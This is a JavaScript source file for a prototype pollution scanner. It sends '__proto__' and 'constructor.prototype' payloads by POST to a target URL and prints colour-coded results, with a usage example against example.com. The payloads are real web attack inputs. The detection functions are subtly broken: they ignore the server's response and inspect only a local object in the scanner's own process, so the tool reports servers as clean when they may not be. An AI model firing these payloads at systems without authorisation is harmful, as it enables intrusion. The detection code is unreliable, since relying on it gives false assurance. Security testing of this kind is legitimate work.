const axios = require('axios');
const chalk = require('chalk');

class PrototypePollutionScanner {
  constructor(targetUrl, options = {}) {
    this.targetUrl = targetUrl;
    this.options = {
      method: 'POST', // Default to POST as it's more common for prototype pollution
      headers: {
        'Content-Type': 'application/json'
      },
      timeout: 5000,
      verbose: false,
      ...options
    };
    this.vulnerable = false;
    this.testPayloads = this.generateTestPayloads();
  }

  generateTestPayloads() {
    // Common prototype pollution test payloads
    return [
      { '__proto__': { 'polluted': true } },
      { 'constructor': { 'prototype': { 'polluted': true } } },
      { 'constructor': { 'prototype': { 'toString': 'polluted' } } },
      { 'prototype': { 'polluted': true } }
    ];
  }

  async scan() {
    console.log(chalk.blue(`[+] Starting prototype pollution scan for ${this.targetUrl}`));
    
    for (const payload of this.testPayloads) {
      try {
        if (this.options.verbose) {
          console.log(chalk.gray(`[.] Testing payload: ${JSON.stringify(payload)}`));
        }

        const response = await axios({
          method: this.options.method,
          url: this.targetUrl,
          data: payload,
          headers: this.options.headers,
          timeout: this.options.timeout
        });

        // Check if the pollution was successful by requesting a fresh object
        const checkResponse = await axios.get(this.targetUrl);
        
        if (this.checkForPollution(checkResponse.data)) {
          this.vulnerable = true;
          console.log(chalk.red(`[!] Prototype pollution vulnerability found with payload: ${JSON.stringify(payload)}`));
          console.log(chalk.red(`[!] Affected property: ${this.getPollutedProperty(checkResponse.data)}`));
          return true;
        }
      } catch (error) {
        if (this.options.verbose) {
          console.log(chalk.yellow(`[!] Error testing payload ${JSON.stringify(payload)}: ${error.message}`));
        }
      }
    }

    if (!this.vulnerable) {
      console.log(chalk.green(`[+] No prototype pollution vulnerabilities detected`));
    }
    return false;
  }

  checkForPollution(data) {
    try {
      // Try to create a new object and check if polluted properties exist
      const testObj = {};
      return testObj.polluted === true || 
             testObj.toString === 'polluted' || 
             this.hasPollutedProperties(testObj);
    } catch (e) {
      return false;
    }
  }

  hasPollutedProperties(obj) {
    // Check for unexpected properties in object prototype
    for (const key in obj) {
      if (!obj.hasOwnProperty(key) && key === 'polluted') {
        return true;
      }
    }
    return false;
  }

  getPollutedProperty(data) {
    const testObj = {};
    if (testObj.polluted === true) return 'polluted';
    if (testObj.toString === 'polluted') return 'toString';
    
    for (const key in testObj) {
      if (!testObj.hasOwnProperty(key)) {
        return key;
      }
    }
    return 'unknown';
  }
}

// Usage example
(async () => {
  const scanner = new PrototypePollutionScanner('http://example.com/api', {
    verbose: true,
    method: 'POST'
  });
  
  await scanner.scan();
})();
